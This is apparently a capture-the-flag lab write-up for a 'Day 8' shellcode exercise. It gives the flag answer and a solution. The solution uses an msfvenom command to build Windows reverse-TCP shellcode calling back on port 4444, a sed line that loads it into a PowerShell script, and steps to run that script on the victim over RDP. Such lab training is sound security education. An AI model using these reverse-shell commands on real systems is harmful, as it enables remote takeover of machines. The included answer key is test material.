# Day_8
*Shellcodes and reverse shells? Shouldn't be too hard!*


1. ***What is the flag value once Glitch gets reverse shell on the digital vault using port 4444? Note: The flag may take around a minute to appear in the C:\Users\glitch\Desktop directory. You can view the content of the flag by using the command type C:\Users\glitch\Desktop\flag.txt.***
- **Answer:** `AOC{GOT_MY_ACCESS_B@CK007}`
> **Solution:**
> Generate shellcode with `msfvenom -p windows/x64/shell_reverse_tcp LHOST=$(ip a | grep -oP "10.\d+.\d+.\d+" | head -1\n) LPORT=4444 -f powershell -o shellcode.ps1`
> `sed "s/SHELLCODE_PLACEHOLDER/$(cat shellcode.ps1 | cut -d' ' -f 4)/" code.ps1 > code_loaded.ps1`
> Listen locally on `4444`, rdp to the victim and execute `code_loaded.ps1`
